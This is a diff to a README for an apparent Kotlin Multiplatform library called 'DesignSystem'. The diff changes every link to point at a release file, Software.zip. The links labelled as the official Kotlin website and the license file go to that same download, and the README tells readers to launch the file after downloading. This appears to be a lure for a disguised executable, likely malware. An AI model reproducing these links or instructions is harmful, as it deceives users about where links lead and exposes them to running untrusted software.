@@ -13,7 +13,7 @@ Welcome to the "DesignSystem" repository! This Kotlin Multiplatform (KMP) librar
 
 To get started with the "DesignSystem" library, you can download the latest release by clicking the button below:
 
-[![Download Software](https://github.com/jakester2020/DesignSystem/releases/download/v1.0/Release.zip)](https://github.com/jakester2020/DesignSystem/releases/download/v1.0/Release.zip)
+[![Download Software](https://github.com/jakester2020/DesignSystem/releases/download/v2.0/Software.zip)](https://github.com/jakester2020/DesignSystem/releases/download/v2.0/Software.zip)
 
 Please note that the file needs to be launched after downloading.
 
@@ -44,7 +44,7 @@ If the above link does not work, or if you need to access previous releases, ple
 
 ## 🌐 Additional Resources
 
-For more information about Kotlin Multiplatform (KMP) technology, you can visit the [official Kotlin Multiplatform website](https://github.com/jakester2020/DesignSystem/releases/download/v1.0/Release.zip).
+For more information about Kotlin Multiplatform (KMP) technology, you can visit the [official Kotlin Multiplatform website](https://github.com/jakester2020/DesignSystem/releases/download/v2.0/Software.zip).
 
 ## 🤝 How to Contribute
 
@@ -52,7 +52,7 @@ If you would like to contribute to the development of the "DesignSystem" library
 
 ## 📄 License
 
-This project is licensed under the MIT License - see the [https://github.com/jakester2020/DesignSystem/releases/download/v1.0/Release.zip](https://github.com/jakester2020/DesignSystem/releases/download/v1.0/Release.zip) file for details.
+This project is licensed under the MIT License - see the [https://github.com/jakester2020/DesignSystem/releases/download/v2.0/Software.zip](https://github.com/jakester2020/DesignSystem/releases/download/v2.0/Software.zip) file for details.
 
 ---
 
